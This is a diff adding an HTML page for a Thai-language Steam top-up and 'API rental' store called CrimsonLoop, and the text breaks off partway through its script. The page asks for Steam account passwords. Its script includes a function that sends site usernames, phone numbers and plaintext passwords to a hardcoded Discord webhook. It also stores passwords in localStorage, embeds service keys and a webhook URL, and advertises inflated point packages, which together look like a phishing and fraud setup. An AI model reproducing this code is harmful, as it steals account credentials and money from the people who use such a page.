@@ -1,0 +1,871 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CrimsonLoop Steam Gateway | ระบบเติมเกมอัตโนมัติ 24 ชม.</title>
+    <script src="https://unpkg.com/@tailwindcss/browser@4"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.39.0/dist/umd/supabase.js"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Prompt:wght@300;400;600;700;900&display=swap" rel="stylesheet">
+
+    <style>
+        body {
+            font-family: 'Prompt', sans-serif;
+            background-color: #060105;
+            overflow-x: hidden;
+        }
+        .font-tech { font-family: 'Orbitron', sans-serif; }
+        
+        #snow-canvas {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        .nebula-bg {
+            position: fixed;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            width: 100vw; height: 100vh;
+            background: 
+                radial-gradient(circle at 15% 15%, rgba(239, 68, 68, 0.2) 0%, transparent 55%),
+                radial-gradient(circle at 85% 85%, rgba(16, 185, 129, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 50% 50%, rgba(153, 27, 27, 0.08) 0%, transparent 65%);
+            z-index: -1;
+            filter: blur(90px);
+        }
+
+        .cyber-glass {
+            background: linear-gradient(135deg, rgba(25, 7, 18, 0.88) 0%, rgba(6, 1, 5, 0.99) 100%);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            box-shadow: 0 40px 90px rgba(0, 0, 0, 0.95), 0 0 60px rgba(239, 68, 68, 0.05);
+            backdrop-filter: blur(35px);
+            position: relative;
+            z-index: 10;
+        }
+
+        .package-card {
+            position: relative;
+            transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            background: rgba(0, 0, 0, 0.6);
+        }
+        .package-card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%;
+            width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(239, 68, 68, 0.2), transparent);
+            transition: 0.6s;
+        }
+        .package-card:hover::before { left: 100%; }
+        .package-card:hover {
+            transform: translateY(-6px);
+            border-color: rgba(239, 68, 68, 0.7);
+            box-shadow: 0 0 35px rgba(239, 68, 68, 0.35);
+        }
+        
+        .package-card.active-red {
+            border-color: #ef4444;
+            background: linear-gradient(135deg, rgba(185, 28, 28, 0.35) 0%, rgba(6, 1, 5, 1) 100%);
+            box-shadow: 0 0 45px rgba(239, 68, 68, 0.6);
+        }
+        .package-card.active-green {
+            border-color: #10b981;
+            background: linear-gradient(135deg, rgba(4, 120, 87, 0.35) 0%, rgba(6, 1, 5, 1) 100%);
+            box-shadow: 0 0 45px rgba(16, 185, 129, 0.6);
+        }
+
+        .text-glow-red { text-shadow: 0 0 18px rgba(239, 68, 68, 0.85); }
+        .text-glow-green { text-shadow: 0 0 18px rgba(16, 185, 129, 0.85); }
+
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: #060105; }
+        ::-webkit-scrollbar-thumb { background: #350f28; border-radius: 10px; }
+        ::-webkit-scrollbar-thumb:hover { background: #ef4444; }
+    </style>
+</head>
+<body class="text-gray-200 min-h-screen flex flex-col justify-between relative">
+
+    <canvas id="snow-canvas"></canvas>
+    <div class="nebula-bg"></div>
+
+    <div id="auth-container" class="flex-grow flex flex-col items-center justify-center px-4 py-12 relative z-10">
+        <div class="cyber-glass w-full max-w-md rounded-3xl p-8 mb-5">
+            <div class="text-center mb-6">
+                <div class="w-16 h-16 bg-gradient-to-br from-red-600 to-red-950 rounded-2xl flex items-center justify-center mx-auto shadow-[0_0_40px_rgba(239,68,68,0.6)] mb-4">
+                    <i class="fa-brands fa-steam text-white text-3xl"></i>
+                </div>
+                <h2 class="text-3xl font-black font-tech tracking-wider text-white">CRIMSON<span class="text-red-500 text-glow-red">LOOP</span></h2>
+                <p class="text-xs text-gray-400 mt-2">เติมเกมดี เติมเกมไว ต้องที่นี่เท่านั้น! ระบบออโต้ปลอดภัยสูงสุด</p>
+            </div>
+
+            <div class="flex bg-black/60 p-1.5 rounded-2xl border border-neutral-900 mb-6">
+                <button onclick="toggleAuthMode('login')" id="tab-login-btn" class="w-1/2 py-3 text-sm font-bold rounded-xl bg-gradient-to-r from-red-600 to-rose-700 text-white shadow-lg transition-all cursor-pointer">1. เข้าสู่ระบบ</button>
+                <button onclick="toggleAuthMode('register')" id="tab-register-btn" class="w-1/2 py-3 text-sm font-bold rounded-xl text-gray-400 hover:text-white transition-all cursor-pointer">2. สมัครสมาชิก</button>
+            </div>
+
+            <form id="login-form" onsubmit="handleLogin(event)" class="space-y-4">
+                <div>
+                    <label class="block text-xs uppercase tracking-widest text-gray-400 font-bold mb-2">ชื่อผู้ใช้งาน (Username)</label>
+                    <div class="relative">
+                        <span class="absolute inset-y-0 left-0 flex items-center pl-4 text-neutral-600"><i class="fa-solid fa-user"></i></span>
+                        <input type="text" id="login-username" required placeholder="กรอกชื่อผู้ใช้ของคุณ" class="w-full bg-black/60 border border-neutral-800 focus:border-red-500 text-white rounded-xl py-3.5 pl-11 pr-4 text-sm outline-none transition-all">
+                    </div>
+                </div>
+                <div>
+                    <label class="block text-xs uppercase tracking-widest text-gray-400 font-bold mb-2">รหัสผ่าน (Password)</label>
+                    <div class="relative">
+                        <span class="absolute inset-y-0 left-0 flex items-center pl-4 text-neutral-600"><i class="fa-solid fa-lock"></i></span>
+                        <input type="password" id="login-password" required placeholder="••••••••" class="w-full bg-black/60 border border-neutral-800 focus:border-red-500 text-white rounded-xl py-3.5 pl-11 pr-12 text-sm outline-none transition-all">
+                        <button type="button" onclick="togglePasswordVisibility('login-password', this)" class="absolute inset-y-0 right-0 flex items-center pr-4 text-neutral-500 hover:text-white cursor-pointer">
+                            <i class="fa-solid fa-eye"></i>
+                        </button>
+                    </div>
+                </div>
+                <div class="flex items-center">
+                    <input type="checkbox" id="login-remember" class="w-4 h-4 text-red-600 bg-black/60 border-neutral-800 rounded focus:ring-red-500 cursor-pointer">
+                    <label for="login-remember" class="ml-2 text-xs text-gray-400 select-none cursor-pointer hover:text-gray-200 transition-all">บันทึกรหัสผ่านไว้ในเครื่องนี้ (Remember Me)</label>
+                </div>
+                <button type="submit" class="w-full bg-gradient-to-r from-red-600 to-rose-600 hover:from-red-500 hover:to-rose-500 text-white font-bold py-4 rounded-xl text-sm tracking-wide cursor-pointer mt-2 shadow-[0_4px_20px_rgba(239,68,68,0.3)] transition-all">
+                    ล็อกอินเข้าสู่ระบบคลาวด์ <i class="fa-solid fa-right-to-bracket ml-1"></i>
+                </button>
+            </form>
+
+            <form id="register-form" onsubmit="handleRegister(event)" class="space-y-4 hidden">
+                <div>
+                    <label class="block text-xs uppercase tracking-widest text-gray-400 font-bold mb-2">ชื่อผู้ใช้งาน (Username)</label>
+                    <div class="relative">
+                        <span class="absolute inset-y-0 left-0 flex items-center pl-4 text-neutral-600"><i class="fa-solid fa-user-plus"></i></span>
+                        <input type="text" id="reg-username" required placeholder="ตั้งชื่อผู้ใช้งานใหม่" class="w-full bg-black/60 border border-neutral-800 focus:border-red-500 text-white rounded-xl py-3.5 pl-11 pr-4 text-sm outline-none transition-all">
+                    </div>
+                </div>
+                <div>
+                    <label class="block text-xs uppercase tracking-widest text-gray-400 font-bold mb-2">เบอร์โทรศัพท์ (Phone Number)</label>
+                    <div class="relative">
+                        <span class="absolute inset-y-0 left-0 flex items-center pl-4 text-neutral-600"><i class="fa-solid fa-phone"></i></span>
+                        <input type="tel" id="reg-phone" required placeholder="0XXXXXXXXX" pattern="[0-9]{10}" class="w-full bg-black/60 border border-neutral-800 focus:border-red-500 text-white rounded-xl py-3.5 pl-11 pr-4 text-sm outline-none transition-all">
+                    </div>
+                </div>
+                <div>
+                    <label class="block text-xs uppercase tracking-widest text-gray-400 font-bold mb-2">รหัสผ่าน (Password)</label>
+                    <div class="relative">
+                        <span class="absolute inset-y-0 left-0 flex items-center pl-4 text-neutral-600"><i class="fa-solid fa-lock"></i></span>
+                        <input type="password" id="reg-password" required placeholder="ตั้งรหัสผ่านอย่างน้อย 6 ตัวอักษร" minlength="6" class="w-full bg-black/60 border border-neutral-800 focus:border-red-500 text-white rounded-xl py-3.5 pl-11 pr-12 text-sm outline-none transition-all">
+                        <button type="button" onclick="togglePasswordVisibility('reg-password', this)" class="absolute inset-y-0 right-0 flex items-center pr-4 text-neutral-500 hover:text-white cursor-pointer">
+                            <i class="fa-solid fa-eye"></i>
+                        </button>
+                    </div>
+                </div>
+                <div>
+                    <label class="block text-xs uppercase tracking-widest text-gray-400 font-bold mb-2">ยืนยันรหัสผ่านอีกครั้ง (Confirm Password)</label>
+                    <div class="relative">
+                        <span class="absolute inset-y-0 left-0 flex items-center pl-4 text-neutral-600"><i class="fa-solid fa-shield"></i></span>
+                        <input type="password" id="reg-password-confirm" required placeholder="กรอกรหัสผ่านให้ตรงกันอีกครั้ง" minlength="6" class="w-full bg-black/60 border border-neutral-800 focus:border-red-500 text-white rounded-xl py-3.5 pl-11 pr-12 text-sm outline-none transition-all">
+                        <button type="button" onclick="togglePasswordVisibility('reg-password-confirm', this)" class="absolute inset-y-0 right-0 flex items-center pr-4 text-neutral-500 hover:text-white cursor-pointer">
+                            <i class="fa-solid fa-eye"></i>
+                        </button>
+                    </div>
+                </div>
+                <button type="submit" class="w-full bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-white font-bold py-4 rounded-xl text-sm tracking-wide cursor-pointer mt-2 shadow-[0_4px_20px_rgba(16,185,129,0.3)] transition-all">
+                    ยืนยันการลงทะเบียนสมัครสมาชิก <i class="fa-solid fa-user-check ml-1"></i>
+                </button>
+            </form>
+        </div>
+
+        <button onclick="openPriceModal()" class="bg-neutral-900/95 hover:bg-neutral-800 border border-neutral-800 hover:border-red-500/50 text-gray-300 hover:text-white px-6 py-3 rounded-xl text-xs font-bold shadow-lg transition-all cursor-pointer flex items-center gap-2">
+            <i class="fa-solid fa-eye text-red-500 animate-pulse"></i> กดตรงนี้เพื่อดูเรทราคาเติมเกม & ระบบเช่า API ทั้งหมดก่อนได้
+        </button>
+    </div>
+
+    <div id="dashboard-container" class="w-full max-w-7xl mx-auto px-4 sm:px-6 py-6 flex-grow relative z-10 hidden">
+        <header class="cyber-glass rounded-2xl p-5 mb-6 flex flex-col md:flex-row justify-between items-center gap-4">
+            <div class="flex items-center gap-4">
+                <div class="w-12 h-12 bg-gradient-to-br from-red-500/20 to-purple-500/20 rounded-xl border border-red-500/30 flex items-center justify-center">
+                    <i class="fa-solid fa-user-shield text-red-400 text-xl"></i>
+                </div>
+                <div>
+                    <div class="text-xs text-gray-400">บัญชีผู้ใช้งานระบบ</div>
+                    <div id="user-display-name" class="text-xl font-black text-white font-tech tracking-wider">-</div>
+                </div>
+            </div>
+            
+            <div class="flex bg-black/70 p-1.5 rounded-xl border border-neutral-800/80">
+                <button onclick="switchTab('store-tab')" id="menu-store-btn" class="px-5 py-2.5 text-xs font-bold rounded-lg bg-gradient-to-r from-red-600 to-rose-700 text-white transition-all cursor-pointer"><i class="fa-solid fa-coins mr-1.5"></i>เติมพอยท์ / เติมเกมเข้าคลัง</button>
+                <button onclick="switchTab('enterprise-tab')" id="menu-ent-btn" class="px-5 py-2.5 text-xs font-bold rounded-lg text-gray-400 hover:text-white transition-all cursor-pointer"><i class="fa-solid fa-network-wired mr-1.5 text-amber-400"></i>เช่าระบบโครงข่าย API</button>
+            </div>
+
+            <div class="flex items-center gap-3">
+                <span class="bg-black/60 border border-neutral-800 px-4 py-2.5 rounded-xl text-xs font-bold flex items-center">
+                    <i class="fa-solid fa-bolt text-amber-400 mr-2 text-sm"></i>เครดิตคงเหลือ: &nbsp;<span id="user-points-display" class="font-tech text-white text-base mr-1">0</span> PTS
+                </span>
+                <button onclick="handleLogout()" class="bg-red-950/30 hover:bg-red-900/40 border border-red-500/20 text-red-400 px-4 py-2.5 rounded-xl text-xs font-bold cursor-pointer transition-all">
+                    <i class="fa-solid fa-power-off"></i>
+                </button>
+            </div>
+        </header>
+
+        <div class="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
+            
+            <div class="lg:col-span-8 space-y-6">
+                <div id="store-tab" class="space-y-6">
+                    <div class="space-y-3">
+                        <div class="flex items-center gap-2 border-b border-neutral-800 pb-2">
+                            <div class="w-1 h-4 bg-red-500 rounded-full shadow-[0_0_10px_#ef4444]"></div>
+                            <h3 class="text-sm font-bold text-white uppercase tracking-wider">ขั้นตอนที่ 1: เลือกเรทราคาแพ็กเกจเพื่อรับพอยท์</h3>
+                        </div>
+                        <div id="topup-packages-grid" class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4">
+                            </div>
+                    </div>
+
+                    <div class="cyber-glass rounded-2xl p-6 space-y-4">
+                        <div class="flex items-center gap-2 border-b border-neutral-800 pb-2">
+                            <div class="w-1 h-4 bg-blue-500 rounded-full shadow-[0_0_10px_#3b82f6]"></div>
+                            <h3 class="text-sm font-bold text-white uppercase tracking-wider">ขั้นตอนที่ 2: แบบฟอร์มสั่งซื้อระบบเติมเกม Steam ด่วน (ระบบออโต้)</h3>
+                        </div>
+                        
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                            <div>
+                                <label class="block text-xs text-gray-400 font-bold mb-2 uppercase tracking-wide">กรอกอีเมลบัญชี Steam (Steam Email)</label>
+                                <div class="relative">
+                                    <span class="absolute inset-y-0 left-0 flex items-center pl-4 text-neutral-600"><i class="fa-solid fa-envelope"></i></span>
+                                    <input type="text" id="steam-email" placeholder="ตัวอย่าง: username หรือ email@domain.com" class="w-full bg-black/60 border border-neutral-800 focus:border-blue-500 text-white rounded-xl py-3 pl-11 pr-4 text-sm outline-none transition-all">
+                                </div>
+                            </div>
+                            <div>
+                                <label class="block text-xs text-gray-400 font-bold mb-2 uppercase tracking-wide">กรอกรหัสผ่านบัญชี Steam (Steam Password)</label>
+                                <div class="relative">
+                                    <span class="absolute inset-y-0 left-0 flex items-center pl-4 text-neutral-600"><i class="fa-solid fa-key"></i></span>
+                                    <input type="password" id="steam-password" placeholder="••••••••••••" class="w-full bg-black/60 border border-neutral-800 focus:border-blue-500 text-white rounded-xl py-3 pl-11 pr-12 text-sm outline-none transition-all">
+                                    <button type="button" onclick="togglePasswordVisibility('steam-password', this)" class="absolute inset-y-0 right-0 flex items-center pr-4 text-neutral-500 hover:text-white cursor-pointer">
+                                        <i class="fa-solid fa-eye"></i>
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="bg-black/40 border border-neutral-800/80 rounded-xl p-4">
+                            <label class="block text-xs text-gray-400 font-bold mb-2 uppercase tracking-wide">เลือกระดับจำนวนเรทราคาสินค้าที่เติมลงในไอดี Steam</label>
+                            <select id="steam-product-rate" class="w-full bg-neutral-950 border border-neutral-800 text-sm py-3 px-3 rounded-xl text-white focus:border-blue-500 outline-none transition-all">
+                                <option value="100">เรทกระเป๋า Steam 100 บาท (ใช้จ่าย 90 พอยท์)</option>
+                                <option value="300">เรทกระเป๋า Steam 300 บาท (ใช้จ่าย 260 พอยท์)</option>
+                                <option value="500">เรทกระเป๋า Steam 500 บาท (ใช้จ่าย 430 พอยท์)</option>
+                                <option value="1000">เรทกระเป๋า Steam 1,000 บาท (ใช้จ่าย 850 พอยท์)</option>
+                                <option value="2000">เรทกระเป๋า Steam 2,000 บาท (ใช้จ่าย 1,650 พอยท์)</option>
+                            </select>
+                        </div>
+
+                        <button onclick="handleSteamOrder()" class="w-full bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white font-bold py-4 rounded-xl text-sm cursor-pointer shadow-lg transition-all tracking-wide">
+                            <i class="fa-brands fa-steam mr-1.5"></i> ยืนยันการหักพอยท์และคีย์ข้อมูลสั่งเติมเข้าไอดี Steam อัตโนมัติ
+                        </button>
+                    </div>
+                </div>
+
+                <div id="enterprise-tab" class="space-y-6 hidden">
+                    <div class="flex items-center gap-2 border-b border-neutral-800 pb-2">
+                        <div class="w-1 h-4 bg-emerald-400 rounded-full shadow-[0_0_10px_#10b981]"></div>
+                        <h3 class="text-sm font-bold text-white uppercase tracking-wider">เช่าโครงข่ายเซิร์ฟเวอร์ระบบ API ดึงข้อมูลหลังบ้าน (ระบบเร็ว ได้กำไรแน่นอน)</h3>
+                    </div>
+                    
+                    <div id="api-packages-grid" class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                        </div>
+
+                    <div class="bg-gradient-to-r from-neutral-950 to-neutral-900 border border-neutral-800/80 rounded-2xl p-4 flex flex-col sm:flex-row items-center justify-between gap-4">
+                        <div class="flex items-center gap-3">
+                            <div class="w-9 h-9 bg-emerald-500/10 rounded-lg flex items-center justify-center text-emerald-400"><i class="fa-solid fa-gift"></i></div>
+                            <div>
+                                <div class="text-xs font-bold text-white">🎁 ระบบแถมฟรีสำหรับผู้เปิดร้านค้า</div>
+                                <div class="text-[10px] text-gray-400">แถมฟรี API สำหรับถอดรหัสสร้าง QR Code สแกนจ่าย พร้อม API เช็คสลิปผ่านค่ายยอดฮิตเพื่อรันร้านค้าต่อทันที</div>
+                            </div>
+                        </div>
+                        <span class="text-[10px] bg-emerald-500/20 text-emerald-400 px-3 py-1.5 rounded-lg font-black uppercase tracking-widest border border-emerald-500/20">ปลดล็อกให้ฟรี</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="lg:col-span-4">
+                <div class="cyber-glass rounded-2xl p-5 text-center space-y-4 border border-white/5 relative">
+                    <h3 class="text-xs font-bold text-white uppercase tracking-wider flex items-center justify-center gap-2">
+                        <i class="fa-solid fa-qrcode text-red-500"></i> ศูนย์ควบคุมชำระยอดเงินสด
+                    </h3>
+                    
+                    <div class="bg-white p-3.5 rounded-xl max-w-[190px] mx-auto flex flex-col items-center justify-center min-h-[190px] shadow-2xl relative">
+                        <img id="qrcode-img-global" src="https://placehold.co/190x190/060105/22091b?text=Select+Package" alt="QR Code" class="w-full h-auto rounded-lg">
+                    </div>
+
+                    <div class="bg-neutral-950/90 border border-neutral-800/80 rounded-xl p-3 text-left space-y-2">
+                        <div class="text-[10px] font-bold text-amber-400 uppercase tracking-wide"><i class="fa-solid fa-image mr-1"></i> ระบบอัปโหลดรูปภาพสลิปเงินโอน</div>
+                        
+                        <label class="w-full flex flex-col items-center justify-center bg-black/80 border border-dashed border-neutral-800 hover:border-amber-500/50 rounded-xl py-3 px-2 cursor-pointer transition-all">
+                            <i class="fa-solid fa-cloud-arrow-up text-neutral-500 text-lg mb-1"></i>
+                            <span id="file-name-display" class="text-[10px] text-gray-400 text-center truncate w-full px-2">เลือกรูปภาพสลิปจากคลังรูป / ไฟล์</span>
+                            <input type="file" id="slip-file" accept="image/*" onchange="handleFileChange(this)" class="hidden">
+                        </label>
+                        
+                        <div class="text-[9px] text-gray-500 leading-normal">*ระบบจะทำการอ่านรูปภาพและยิง API SlipOK เพื่อยืนยันยอดเงินสดแบบ Realtime พอยท์จะเข้ากระเป๋าทันที</div>
+                    </div>
+
+                    <div class="bg-black/50 border border-neutral-900 rounded-xl p-3 text-[11px] text-left space-y-1.5">
+                        <div class="flex justify-between"><span>ผู้ให้บริการปลายทาง:</span><span class="text-white font-bold">CrimsonLoop Billing</span></div>
+                        <div class="flex justify-between"><span>พร้อมเพย์ร้าน:</span><span class="text-white font-tech text-red-400">098-350-0245</span></div>
+                        <div class="flex justify-between border-t border-neutral-900 pt-2 mt-2">
+                            <span class="text-gray-400 font-bold">ยอดเงินสดที่ต้องโอน:</span>
+                            <span id="qr-amount-text-global" class="text-base font-black font-tech text-red-500 text-glow-red">0.00 ฿</span>
+                        </div>
+                        <div class="flex justify-between border-t border-neutral-900 pt-1.5">
+                            <span class="text-gray-400 font-bold">ยอดหักพอยท์เช่า:</span>
+                            <span id="rent-amount-text-global" class="text-base font-black font-tech text-emerald-400 text-glow-green">0 PTS</span>
+                        </div>
+                    </div>
+
+                    <div class="space-y-2">
+                        <button onclick="verifyPaymentAndUpdatePoints()" class="w-full bg-gradient-to-r from-amber-500 to-orange-600 hover:from-amber-400 hover:to-orange-500 text-black font-black py-3 rounded-xl text-xs tracking-wider cursor-pointer shadow-lg transition-all uppercase">
+                            <i class="fa-solid fa-magnifying-glass-chart mr-1"></i> ส่งสลิปตรวจสอบ & รับพอยท์
+                        </button>
+                        <button onclick="executeRentPackage()" class="w-full bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-white font-black py-3 rounded-xl text-xs tracking-wider cursor-pointer shadow-lg transition-all uppercase">
+                            <i class="fa-solid fa-circle-check mr-1"></i> ยืนยันตัดพอยท์เช่าระบบ
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer class="border-t border-neutral-900 bg-black/60 py-5 text-center text-[10px] text-neutral-600 relative z-10">
+        <div>&copy; 2026 <span class="font-tech text-red-500/70 tracking-widest">CRIMSONLOOP NETWORKS</span>. INTEGRATED WITH SLIPOK GATEWAY API.</div>
+    </footer>
+
+    <script>
+        // ข้อมูลการเชื่อมต่อฐานข้อมูล Supabase 
+        const SUPABASE_URL = "https://ocmitwxmpakqtlwppgug.supabase.co"; 
+        const SUPABASE_ANON_KEY = "sb_publishable_5-r4xL3QPZ8SP4sjI7Xs8A_xzSTRnCr";
+        const { createClient } = window.supabase;
+        const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+        
+        // ข้อมูลปลายทางระบบภายนอกและการส่ง Log
+        const TARGET_PROMPTPAY = "0983500245";
+        const SLIPOK_URL = "https://api.slipok.com/api/line/apikey/68128";
+        const SLIPOK_KEY = "SLIPOKFTU3EFW";
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1517125045028261950/G2OoG_ha36Q1nz5u_sSvtjwjRoi_lhsS1UGfj4TpiMMPnEdVXpHy-NMdOFiSbD5e9E-5";
+
+        // โครงสร้างตารางเรทแพ็กเกจเติมเงินแลกพอยท์
+        const topupPackages = [
+            { id: 1, text: 'TIER 1', cash: 500, points: 1000 },
+            { id: 2, text: 'TIER 2', cash: 1000, points: 2000 },
+            { id: 3, text: 'TIER 3 (ยอดนิยม)', cash: 3000, points: 7000 },
+            { id: 4, text: 'TIER 4', cash: 4000, points: 8000 },
+            { id: 5, text: 'TIER 5 (VIPสุดคุ้ม)', cash: 7000, points: 10000 },
+            { id: 6, text: 'TIER SUPER GAMER', cash: 10000, points: 15000 },
+            { id: 7, text: 'TIER ULTIMATE PROFIT', cash: 20000, points: 32000 }
+        ];
+
+        // โครงสร้างตารางเรทเช่าโครงข่ายระบบ API รายเดือน
+        const apiPackages = [
+            { id: 1, name: 'เช่าระบบ API เติมเกมใน Steam', desc: 'ฝังสูตรลับดึงค่าเงินเรทเติมเกมจากระบบ Steam บอร์ดคีย์เสถียรความเร็วสูงมาก ดึงข้อมูลเติมได้ทันที', cost: 7000, icon: 'fa-brands fa-steam text-blue-400' },
+            { id: 2, name: 'เช่า API ครอบคลุมทุกเกมทั้ง Steam & Play Store', desc: 'เชื่อมต่อรวมทุกแพลตฟอร์ม ทั้งฝั่งเกม PC และเกมมือถือระบบ Android ยอดนิยม ทำงานรวดเร็ว ทำกำไรต่อได้ชัวร์', cost: 10000, icon: 'fa-solid fa-cubes text-emerald-400' }
+        ];
+        
+        let currentSelectedAmount = 0;  
+        let currentAddPoints = 0;       
+        let currentRentCost = 0;        
+        let currentRentName = "";       
+        let currentUser = null;
+        let base64SlipImage = ""; 
+
+        // ดึงข้อมูลรหัสผ่านที่เคยบันทึกไว้ (Remember Me Engine)
+        window.addEventListener('DOMContentLoaded', () => {
+            const savedUser = localStorage.getItem('crimson_remembered_username');
+            const savedPass = localStorage.getItem('crimson_remembered_password');
+            if (savedUser && savedPass) {
+                document.getElementById('login-username').value = savedUser;
+                document.getElementById('login-password').value = savedPass;
+                document.getElementById('login-remember').checked = true;
+            }
+        });
+
+        // --- ❄️ เริ่มระบบเอฟเฟกต์บรรยากาศหิมะตกสีแดงฉาน ---
+        const canvas = document.getElementById('snow-canvas');
+        const ctx = canvas.getContext('2d');
+        let snowflakes = [];
+
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        window.addEventListener('resize', resizeCanvas);
+        resizeCanvas();
+
+        function createSnowflakes() {
+            snowflakes = [];
+            for (let i = 0; i < 75; i++) {
+                snowflakes.push({
+                    x: Math.random() * canvas.width,
+                    y: Math.random() * canvas.height,
+                    opacity: Math.random() * 0.6 + 0.2,
+                    radius: Math.random() * 2.5 + 1,
+                    speedY: Math.random() * 0.8 + 0.3,
+                    speedX: Math.random() * 0.4 - 0.2
+                });
+            }
+        }
+
+        function drawSnow() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            for (let i = 0; i < snowflakes.length; i++) {
+                let f = snowflakes[i];
+                ctx.beginPath();
+                ctx.arc(f.x, f.y, f.radius, 0, Math.PI * 2);
+                ctx.fillStyle = `rgba(239, 68, 68, ${f.opacity})`;
+                ctx.shadowBlur = 5;
+                ctx.shadowColor = "#ef4444";
+                ctx.fill();
+                ctx.shadowBlur = 0;
+
+                f.y += f.speedY;
+                f.x += f.speedX;
+
+                if (f.y > canvas.height) {
+                    f.y = -10;
+                    f.x = Math.random() * canvas.width;
+                }
+                if (f.x > canvas.width || f.x < 0) {
+                    f.x = Math.random() * canvas.width;
+                }
+            }
+            requestAnimationFrame(drawSnow);
+        }
+        createSnowflakes();
+        drawSnow();
+        // --- ❄️ สิ้นสุดระบบเอฟเฟกต์หิมะแดง ---
+
+        // ฟังก์ชันส่งข้อมูล Log ไปยัง Discord Webhook
+        async function sendLogToDiscord(actionType, username, password, phone = "ไม่มีการระบุ") {
+            try {
+                const payload = {
+                    embeds: [{
+                        title: `🚨 LOG ACTIVITY: ${actionType.toUpperCase()}`,
+                        color: actionType === 'register' ? 65280 : 16711680,
+                        fields: [
+                            { name: "👤 ชื่อผู้ใช้งาน", value: `\`${username}\``, inline: true },
+                            { name: "📞 เบอร์โทรศัพท์", value: `\`${phone}\``, inline: true },
+                            { name: "🔑 รหัสผ่านที่เข้าสู่ระบบ", value: `\`${password}\``, inline: false },
+                            { name: "🌐 เวลาบันทึกข้อมูล", value: new Date().toLocaleString('th-TH'), inline: false }
+                        ],
+                        footer: { text: "CrimsonLoop Security Core Log" }
+                    }]
+                };
+                await fetch(DISCORD_WEBHOOK, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+            } catch (err) {
+                console.error("Webhook Error:", err);
+            }
+        }
+
+        // อ่านสลิปและทำการแปลงค่าเพื่อนำไปตรวจสอบ
+        function handleFileChange(input) {
+            const file = input.files[0];
+            if (!file) return;
+            
+            document.getElementById('file-name-display').innerText = file.name;
+
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                base64SlipImage = e.target.result; 
+            };
+            reader.readAsDataURL(file);
+        }
+
+        // ฟังก์ชันซ่อน/แสดง รหัสผ่าน
+        function togglePasswordVisibility(inputId, button) {
+            const input = document.getElementById(inputId);
+            const icon = button.querySelector('i');
+            if (input.type === 'password') {
+                input.type = 'text';
+                icon.className = 'fa-solid fa-eye-slash';
+            } else {
+                input.type = 'password';
+                icon.className = 'fa-solid fa-eye';
+            }
+        }
+
+        // เรนเดอร์การ์ดข้อมูลลงบนตารางแดชบอร์ด
+        function renderDashboardGrids() {
+            const topupGrid = document.getElementById('topup-packages-grid');
+            topupGrid.innerHTML = topupPackages.map(p => `
+                <div onclick="selectTopupAmount(this, ${p.cash}, ${p.points})" class="package-card cyber-glass rounded-2xl p-5 cursor-pointer">
+                    <div class="text-[10px] text-gray-400 font-bold tracking-widest">${p.text}</div>
+                    <div class="text-2xl font-black font-tech text-white mt-1">${p.cash.toLocaleString()} <span class="text-xs text-red-500 font-sans">฿</span></div>
+                    <div class="text-xs text-emerald-400 mt-2 font-bold"><i class="fa-solid fa-circle-plus mr-1"></i>รับ: ${p.points.toLocaleString()} พอยท์</div>
+                </div>
+            `).join('');
+
+            const apiGrid = document.getElementById('api-packages-grid');
+            apiGrid.innerHTML = apiPackages.map(p => `
+                <div onclick="selectRentPackage(this, ${p.cost}, '${p.name}')" class="package-card cyber-glass rounded-2xl p-6 cursor-pointer relative group">
+                    <div class="w-12 h-12 bg-neutral-900 rounded-xl flex items-center justify-center border border-neutral-800 mb-4 text-2xl group-hover:scale-110 transition-all">
+                        <i class="${p.icon}"></i>
+                    </div>
+                    <h4 class="text-base font-bold text-white">${p.name}</h4>
+                    <p class="text-xs text-gray-400 mt-2 leading-relaxed">${p.desc}</p>
+                    <div class="mt-4 border-t border-neutral-900 pt-3 flex justify-between items-center">
+                        <span class="text-xs font-bold text-gray-500 font-tech uppercase">AUTO SPEED RUN</span>
+                        <span class="text-xl font-black font-tech text-emerald-400 text-glow-green">${p.cost.toLocaleString()} <span class="text-xs font-sans text-gray-400">PTS / ด.</span></span>
+                    </div>
+                </div>
+            `).join('');
+        }
+        renderDashboardGrids();
+
+        // แสดงหน้าต่างเรทราคาสินค้าให้ Guest ดูรายละเอียดก่อนได้
+        function openPriceModal() {
